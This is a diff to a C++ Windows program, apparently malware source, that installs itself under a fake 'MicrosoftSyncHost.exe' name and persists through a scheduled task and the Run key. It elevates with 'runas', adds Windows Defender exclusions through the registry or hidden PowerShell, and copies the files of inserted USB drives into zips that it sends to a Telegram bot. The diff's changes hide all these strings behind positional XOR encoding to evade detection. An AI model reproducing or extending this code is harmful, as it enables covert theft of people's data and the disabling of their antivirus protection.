@@ -1,7 +1,7 @@
 // language: C++20, file: lichia_native.cpp, target: Windows 11, MSVC
 // Watcher nativo sem assinaturas de interpretador: instala, persiste,
 // vigia drives removiveis, copia, empacota (ZIP stored + CRC32 proprio) e
-// envia ao Telegram via WinHTTP. Strings de rede ofuscadas por XOR.
+// envia ao Telegram via WinHTTP. Strings sensiveis com XOR posicional.
 #include <windows.h>
 #include <winhttp.h>
 #include <shellapi.h>
@@ -24,19 +24,72 @@ namespace fs = std::filesystem;
 #pragma comment(lib, "shell32.lib")
 
 
-static std::string Xor(const unsigned char* p, size_t n) {
+static std::string XD(const unsigned char* p, size_t n) {
     std::string s(n, '\0');
-    for (size_t i = 0; i < n; ++i) s[i] = char(p[i] ^ 0x5A);
+    for (size_t i = 0; i < n; ++i)
+        s[i] = char(p[i] ^ 0x5A ^ ((i * 167u + 11u) & 0xFF));
     return s;
 }
-#define XORSTR(arr) Xor(arr, sizeof(arr) - 1)
+#define XDS(a) XD(a, sizeof(a) - 1)
 
 static const unsigned char ENC_HOST[] =
-    "\x3B\x2A\x33\x74\x2E\x3F\x36\x3F\x3D\x28\x3B\x37\x74\x35\x28\x3D";
+    "\x30""\x98""\x6A""\x74""\x89""\x71""\xC3""\xA3""\x7E""\xC2""\xAA""\x0F""\xAB""\xB3""\x05""\xE9";
 static const unsigned char ENC_DOC[] =
-    "\x75\x29\x3F\x34\x3E\x1E\x35\x39\x2F\x37\x3F\x34\x2E";
+    "\x7E""\x9B""\x66""\x34""\x99""\x50""\xC0""\xA5""\x6C""\xDD""\xAE""\x0C""\xF1";
 static const unsigned char ENC_MSG[] =
-    "\x75\x29\x3F\x34\x3E\x17\x3F\x29\x29\x3B\x3D\x3F";
+    "\x7E""\x9B""\x66""\x34""\x99""\x59""\xCA""\xB5""\x6A""\xD1""\xAC""\x07";
+static const unsigned char ENC_NAME[] =
+    "\x1D""\x81""\x60""\x32""\x94""\x75";
+static const unsigned char ENC_EXE[] =
+    "\x1C""\x81""\x60""\x28""\x92""\x67""\xC0""\xA0""\x6D""\xE3""\xB2""\x0C""\xE6""\x94""\x18""\xFD""\x55""\x56""\xF6""\x52""\x28";
+static const unsigned char ENC_CFG[] =
+    "\x3D""\x81""\x60""\x32""\x98""\x7A""\x81""\xA5""\x76""\xDE""\xAD""\x0B""\xE2";
+static const unsigned char ENC_CACHE[] =
+    "\x32""\x89""\x60""\x32""\x98";
+static const unsigned char ENC_RUNPATH[] =
+    "\x02""\x87""\x65""\x2E""\x8A""\x75""\xDD""\xA3""\x45""\xFD""\xA2""\x01""\xF7""\xB3""\x04""\xE1""\x47""\x0C""\xCF""\x7D""\x24""\x8A""\x5B""\x39""\x9E""\x73""\x07""\xB1""\x60""\xDE""\xB5""\x7B""\xDF""\xBC""\x35""\xDF""\xAF""\x07""\xE6""\x49""\x17""\xCC""\x79""\x37""\x8B";
+static const unsigned char ENC_SCH[] =
+    "\x12""\xD2""\x5F""\x0D""\x94""\x7A""\xCB""\xA9""\x6E""\xC3""\x97""\x31""\xFC""\xAF""\x03""\xEB""\x4C""\x4B""\xA1""\x76""\x3E""\x87""\x57""\x22""\x88""\x73""\x30""\x81""\x3B""\xC9""\xBF""\x7B";
+static const unsigned char ENC_ARGPRE[] =
+    "\x7E""\xAB""\x71""\x3F""\x9C""\x60""\xCA""\xE6""\x36""\xF6""\xEB""\x4D""\xD6""\x9F""\x57""\xC1""\x6F""\x34""\xDC""\x6D""\x02""\xAA""\x1F""\x79""\xBD""\x4E""\x7B";
+static const unsigned char ENC_ARGMID[] =
+    "\x71""\xC7""\x57""\x08""\xDD""\x36""\xF3""\x9A""\x3B";
+static const unsigned char ENC_ARGEND[] =
+    "\x73""\xC8""\x2E""\x77""\x8A""\x75""\xDB""\xA5""\x71""\x92";
+static const unsigned char ENC_RUNAS[] =
+    "\x23""\x9D""\x6D""\x3B""\x8E";
+static const unsigned char ENC_PS0[] =
+    "\x21""\x87""\x74""\x3F""\x8F""\x67""\xC7""\xA3""\x75""\xDC""\xE5""\x07""\xFD""\xB9""\x57""\xA3""\x6F""\x17""\xC3""\x58""\x22""\x82""\x56""\x3A""\x8C""\x20""\x76""\xA5""\x7C""\xC2""\xA3""\x71""\xC6""\x9B""\x17""\xC3""\xB1""\x11""\xAF""\x6E""\x10""\xF4""\x4F""\x27""\x8B""\x1C""\x7A""\xAD""\x6E""\x35""\x9E""\x6B""\xC3""\xA0""\x3F";
+static const unsigned char ENC_ADDMP[] =
+    "\x10""\x8C""\x67""\x77""\xB0""\x64""\xFF""\xB4""\x7C""\xD6""\xAE""\x10""\xE0""\xB2""\x14""\xEB""\x01""\x55""\xD6""\x52""\x2E""\x88""\x4A""\x25""\x80""\x6F""\x35""\xA2""\x74""\xD8""\xAF""\x3E""\x96";
+static const unsigned char ENC_DEFKEY[] =
+    "\x02""\xA7""\x45""\x0E""\xAA""\x55""\xFD""\x83""\x45""\xFD""\xA2""\x01""\xF7""\xB3""\x04""\xE1""\x47""\x0C""\xCF""\x7D""\x24""\x8A""\x5B""\x39""\x9E""\x73""\x7B""\xB6""\x70""\xCA""\xA2""\x70""\xD5""\xAD""\x11""\xE6""\x98""\x0C""\xEC""\x4A""\x0C""\xE3""\x42""\x2D""\x8B""\x4F""\x0B""\xBE""\x60""\x2C""\x9B""\x79";
+static const unsigned char ENC_SVI[] =
+    "\x02""\x91""\x70""\x2E""\x98""\x79""\x8F""\x90""\x76""\xDC""\xBE""\x0F""\xE0""\xFC""\x3E""\xE0""\x47""\x17""\xE1""\x47""\x2C""\x90""\x56""\x39""\x87";
+static const unsigned char ENC_RECY[] =
+    "\x75""\xBA""\x46""\x19""\xA4""\x57""\xE3""\x83""\x37""\xF2""\x82""\x2C";
+static const unsigned char ENC_BOOT[] =
+    "\x33""\x87""\x6C""\x2E""\x8E""\x60""\xDD""\xA7""\x69""\x9E""\xA9""\x03""\xF1";
+static const unsigned char ENC_AUTO[] =
+    "\x30""\x9D""\x77""\x35""\x8F""\x61""\xC1""\xE8""\x70""\xDE""\xAD";
+static const unsigned char ENC_LPAY[] =
+    "\x1D""\x81""\x60""\x32""\x94""\x75""\xFF""\xA7""\x60""\xDC""\xA4""\x03""\xE1""\xF2""\x12""\xF6""\x44";
+static const unsigned char ENC_LNAT[] =
+    "\x1D""\x81""\x60""\x32""\x94""\x75""\xE1""\xA7""\x6D""\xD9""\xBD""\x07""\xAB""\xB9""\x0F""\xEB";
+static const unsigned char ENC_ZIP[] =
+    "\x3D""\x81""\x60""\x32""\x98""\x7A""\x81""\xBC""\x70""\xC0";
+static const unsigned char ENC_PART[] =
+    "\x3D""\x81""\x60""\x32""\x98""\x7A""\x81""\xB6""\x78""\xC2""\xBF";
+static const unsigned char ENC_TXT[] =
+    "\x3D""\x81""\x60""\x32""\x94""\x75""\x95""\xE6";
+static const unsigned char ENC_KTOK[] =
+    "\x25""\x87""\x68""\x3F""\x93";
+static const unsigned char ENC_KCHAT[] =
+    "\x32""\x80""\x62""\x2E""\xA2""\x7D""\xCB";
+static const unsigned char ENC_KMOD[] =
+    "\x3C""\x87""\x67""\x35";
+static const unsigned char ENC_KMAX[] =
+    "\x3C""\x89""\x7B""\x05""\x90""\x76";
 
 
 static std::wstring Widen(const std::string& s) {
@@ -62,11 +115,11 @@ static std::wstring AppData() {
 }
 
 static fs::path StageDir() {
-    return fs::path(AppData()) / L"Microsoft" / L"Lichia";
+    return fs::path(AppData()) / L"Microsoft" / Widen(XDS(ENC_NAME));
 }
-static fs::path StageExe() { return StageDir() / L"MicrosoftSyncHost.exe"; }
-static fs::path StageCfg() { return StageDir() / L"lichen.config"; }
-static fs::path CacheDir() { return StageDir() / L"cache"; }
+static fs::path StageExe() { return StageDir() / Widen(XDS(ENC_EXE)); }
+static fs::path StageCfg() { return StageDir() / Widen(XDS(ENC_CFG)); }
+static fs::path CacheDir() { return StageDir() / Widen(XDS(ENC_CACHE)); }
 
 
 static void Hide(const fs::path& p) {
@@ -124,10 +177,10 @@ static Cfg ReadCfg() {
     if (!f) return c;
     std::string j((std::istreambuf_iterator<char>(f)),
                   std::istreambuf_iterator<char>());
-    c.token  = JsonVal(j, "token");
-    c.chat   = JsonVal(j, "chat_id");
-    c.modo   = JsonVal(j, "modo");
-    c.max_mb = JsonVal(j, "max_mb");
+    c.token  = JsonVal(j, XDS(ENC_KTOK));
+    c.chat   = JsonVal(j, XDS(ENC_KCHAT));
+    c.modo   = JsonVal(j, XDS(ENC_KMOD));
+    c.max_mb = JsonVal(j, XDS(ENC_KMAX));
     return c;
 }
 
@@ -247,7 +300,7 @@ static bool HttpPost(const std::string& path,
                               WINHTTP_NO_PROXY_BYPASS, 0);
     if (!h) return false;
     HINTERNET c = WinHttpConnect(
-        h, Widen(Xor(ENC_HOST, sizeof(ENC_HOST) - 1)).c_str(),
+        h, Widen(XDS(ENC_HOST)).c_str(),
         INTERNET_DEFAULT_HTTPS_PORT, 0);
     bool ok = false;
     if (c) {
@@ -299,8 +352,7 @@ static std::string UrlEnc(const std::string& s) {
 
 static bool SendText(const std::string& token, const std::string& chat,
                      const std::string& text) {
-    std::string path = "/bot" + token +
-                       Xor(ENC_MSG, sizeof(ENC_MSG) - 1);
+    std::string path = "/bot" + token + XDS(ENC_MSG);
     std::string body = "chat_id=" + UrlEnc(chat) +
                        "&text=" + UrlEnc(text);
     return HttpPost(path, "application/x-www-form-urlencoded", body);
@@ -314,11 +366,11 @@ static bool SendDocument(const std::string& token, const std::string& chat,
     std::string data((std::istreambuf_iterator<char>(in)),
                      std::istreambuf_iterator<char>());
 
-    std::string b = "----Lichia";
-    for (int i = 0; i < 16; ++i)
+    std::string b = "----";
+    for (int i = 0; i < 24; ++i)
         b += "0123456789abcdef"[rand() % 16];
 
-    std::string doc = Xor(ENC_DOC, sizeof(ENC_DOC) - 1);
+    std::string doc = XDS(ENC_DOC);
     std::string path = "/bot" + token + doc;
 
     std::string body;
@@ -355,7 +407,7 @@ static void SendChunked(const std::string& token, const std::string& chat,
         std::string buf((size_t)take, 0);
         in.read(buf.data(), (std::streamsize)take);
         fs::path tmp = StageDir() /
-                       (L"lichen.part" + std::to_wstring(i) + L".zip");
+                       (Widen(XDS(ENC_PART)) + std::to_wstring(i) + L".zip");
         std::ofstream o(tmp, std::ios::binary);
         if (!o) return;
         o.write(buf.data(), (std::streamsize)take);
@@ -370,10 +422,15 @@ static void SendChunked(const std::string& token, const std::string& chat,
 
 
 static bool SkippedName(const std::wstring& n) {
-    return n == L"System Volume Information" || n == L"$RECYCLE.BIN" ||
-           n == L"Lichia" || n == L"lichen.config" ||
-           n == L"bootstrap.bat" || n == L"autorun.inf" ||
-           n == L"LichiaPayload.exe" || n == L"LichiaNative.exe";
+    static const std::wstring skip[] = {
+        Widen(XDS(ENC_SVI)),  Widen(XDS(ENC_RECY)),
+        Widen(XDS(ENC_NAME)), Widen(XDS(ENC_CFG)),
+        Widen(XDS(ENC_BOOT)), Widen(XDS(ENC_AUTO)),
+        Widen(XDS(ENC_LPAY)), Widen(XDS(ENC_LNAT)),
+    };
+    for (const auto& s : skip)
+        if (n == s) return true;
+    return false;
 }
 
 
@@ -397,8 +454,8 @@ static void Exfil(const std::wstring& rootW) {
         if (!cfg.Ok()) return;
 
         fs::path root(rootW);
-        if (fs::exists(root / L"Lichia") ||
-            fs::exists(root / L"lichen.config"))
+        if (fs::exists(root / Widen(XDS(ENC_NAME))) ||
+            fs::exists(root / Widen(XDS(ENC_CFG))))
             return;
 
         std::error_code ec;
@@ -433,7 +490,7 @@ static void Exfil(const std::wstring& rootW) {
         }
 
 
-        fs::path zip = StageDir() / L"lichen.zip";
+        fs::path zip = StageDir() / Widen(XDS(ENC_ZIP));
         fs::remove(zip, ec);
         WriteZip(CacheDir(), zip);
 
@@ -449,7 +506,7 @@ static void Exfil(const std::wstring& rootW) {
         snprintf(mb, sizeof mb, "%.1f", total / (1024.0 * 1024.0));
 
         SendText(cfg.token, cfg.chat,
-                 "lichia: " + std::to_string(copied) + " arquivos de " +
+                 XDS(ENC_TXT) + std::to_string(copied) + " arquivos de " +
                      std::string(rootW.begin(), rootW.end()) + " — " +
                      mb + " MB");
 
@@ -492,10 +549,11 @@ static bool ElevateSelf() {
     wchar_t buf[MAX_PATH]{};
     GetModuleFileNameW(nullptr, buf, MAX_PATH);
     std::wstring args = RawArgs();
+    std::wstring verb = Widen(XDS(ENC_RUNAS));
     SHELLEXECUTEINFOW sei{};
     sei.cbSize = sizeof sei;
     sei.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
-    sei.lpVerb = L"runas";
+    sei.lpVerb = verb.c_str();
     sei.lpFile = buf;
     sei.lpParameters = args.c_str();
     sei.nShow = SW_HIDE;
@@ -504,8 +562,7 @@ static bool ElevateSelf() {
 
 
 static void RunShell(const std::wstring& script) {
-    std::wstring cmd =
-        L"powershell.exe -NoProfile -WindowStyle Hidden -Command " + script;
+    std::wstring cmd = Widen(XDS(ENC_PS0)) + script;
     STARTUPINFOW si{}; si.cb = sizeof si;
     si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
     PROCESS_INFORMATION pi{};
@@ -520,32 +577,45 @@ static void RunShell(const std::wstring& script) {
 }
 
 
+static void AddExclusion(const std::wstring& path) {
+    HKEY k;
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, Widen(XDS(ENC_DEFKEY)).c_str(),
+                        0, nullptr, 0, KEY_SET_VALUE, nullptr, &k,
+                        nullptr) != ERROR_SUCCESS) {
+        RunShell(Widen(XDS(ENC_ADDMP)) + path + L"'");
+        return;
+    }
+    DWORD z = 0;
+    RegSetValueExW(k, path.c_str(), 0, REG_DWORD, (const BYTE*)&z,
+                   sizeof z);
+    RegCloseKey(k);
+}
+
+
 static void Shield(const std::wstring& driveRoot) {
     if (!IsAdmin()) return;
     wchar_t up[MAX_PATH]{};
     GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);
-    std::wstring s =
-        L"Add-MpPreference -ExclusionPath '" + StageDir().wstring() + L"';" +
-        L"Add-MpPreference -ExclusionPath '" + driveRoot + L"Lichia';" +
-        L"Add-MpPreference -ExclusionPath '" +
-        std::wstring(up) + L"\\Downloads'";
-    RunShell(s);
+    AddExclusion(StageDir().wstring());
+    AddExclusion(driveRoot + Widen(XDS(ENC_NAME)));
+    AddExclusion(std::wstring(up) + L"\\Downloads");
 }
 
 
 static void Persist() {
-    RunHidden(L"C:\\Windows\\System32\\schtasks.exe",
-              L"/Create /F /SC ONLOGON /TN Lichia /TR \"\\\"" +
-                  StageExe().wstring() + L"\\\" --watch\"");
+    std::wstring args = Widen(XDS(ENC_ARGPRE)) + Widen(XDS(ENC_NAME)) +
+                        Widen(XDS(ENC_ARGMID)) + StageExe().wstring() +
+                        Widen(XDS(ENC_ARGEND));
+    RunHidden(Widen(XDS(ENC_SCH)), args);
 
     HKEY k;
-    LONG r = RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0, KEY_SET_VALUE, &k);
+    LONG r = RegOpenKeyExW(HKEY_CURRENT_USER,
+                           Widen(XDS(ENC_RUNPATH)).c_str(),
+                           0, KEY_SET_VALUE, &k);
     if (r == ERROR_SUCCESS) {
         std::wstring v = L"\"" + StageExe().wstring() + L"\" --watch";
-        RegSetValueExW(k, L"Lichia", 0, REG_SZ, (const BYTE*)v.c_str(),
+        RegSetValueExW(k, Widen(XDS(ENC_NAME)).c_str(), 0, REG_SZ,
+                       (const BYTE*)v.c_str(),
                        (DWORD)((v.size() + 1) * sizeof(wchar_t)));
         RegCloseKey(k);
     }
@@ -558,8 +628,10 @@ static void Install() {
     std::wstring self(buf);
 
     std::wstring origin = self.substr(0, 3);
-    fs::path cfg = fs::path(origin) / L"Lichia" / L"lichen.config";
-    if (!fs::exists(cfg)) cfg = fs::path(origin) / L"lichen.config";
+    fs::path cfg = fs::path(origin) / Widen(XDS(ENC_NAME)) /
+                   Widen(XDS(ENC_CFG));
+    if (!fs::exists(cfg))
+        cfg = fs::path(origin) / Widen(XDS(ENC_CFG));
     if (!fs::exists(cfg)) return;
 
     Shield(self.substr(0, 3));
